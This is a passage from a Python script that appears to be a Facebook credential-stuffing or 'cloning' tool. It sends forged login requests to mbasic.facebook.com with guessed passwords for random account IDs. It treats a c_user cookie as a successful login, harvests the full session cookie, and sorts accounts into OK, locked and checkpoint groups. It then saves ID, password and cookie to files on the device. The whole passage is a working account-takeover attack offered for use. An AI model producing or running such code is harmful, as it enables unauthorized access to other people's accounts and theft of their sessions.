'{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"nlnwft:68\\",\\"password_text_input_id\\":\\"nlnwft:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"142710911300379\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+ids+'\\",\\"password\\":\\"#'+pax+':0:'+str(time.time()).split('.')[0]+':'+pas+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
				headers = {'Host': 'mbasic.facebook.com','Connection': 'keep-alive','sec-ch-ua-platform': '"Android"','sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"','sec-ch-ua-model': '""','sec-ch-ua-mobile': '?1','sec-ch-prefers-color-scheme': 'light','User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8','sec-ch-ua-platform-version': '""','Accept': '*/*','Origin': 'https://mbasic.facebook.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://mbasic.facebook.com/','Accept-Language': 'en-US,en;q=0.9',}
				session.post('https://mbasic.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a',data=data,headers=headers,allow_redirects=False)
				___NOORX___ = session.cookies.get_dict().keys()
				if "c_user" in ___NOORX___:
					cookie = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					uid = cookie.split("c_user=")[1].split(";")[0]
					res = str(requests.get(f'https://graph.facebook.com/{str(uid)}/picture?type=normal').text)
					if 'Photoshop' in res:
						print(f"\r{G}[IMRAN-Ok]{W} {G}{str(uid)}{W} {G}|{W} {G}{pas}{W} ")
						if 'y' in self.cokiex:
							print(f"\r[Cookie-🍪] {colorX} {cookie}{W}\n ")
						open('/sdcard/IMRAN-Random-M5-OK.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')
						self.oks.append(str(uid))
						break
					else:
						if 'y' in self.cp2f:
							print(f"\r{Y}[IMRAN-LK]{W} {Y}{str(uid)}{W} {Y}|{W} {Y}{pas}{W} ")
						open('/sdcard/IMRAN-Random-M5-lk.txt','a').write(str(uid)+'|'+pas+'\n')
						self.lks.append(str(uid))
						break
				if 'checkpoint' in ___NOORX___:
					uid = session.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
					if 'y' in self.cp2f:
						print(f"\r{R}[IMRAN-CP]{W} {R}{str(uid)}{W} {R}|{W} {R}{pas}{W} ")
					open('/sdcard/IMRAN-Random-M5-CP.txt','a').write(str(uid)+'|'+pas+'\n')
					self.cps.append(str(uid))
					break
				else:
					continue
			self.loop+=1
		except requests.exceptions.Timeout:
			sleep(31)
		except requests.exceptions.ConnectionError:
			sleep(31)
		except Exception as e:
			pass

try:
    ___cloud___().menu()
except Exception as e:
    print(e)
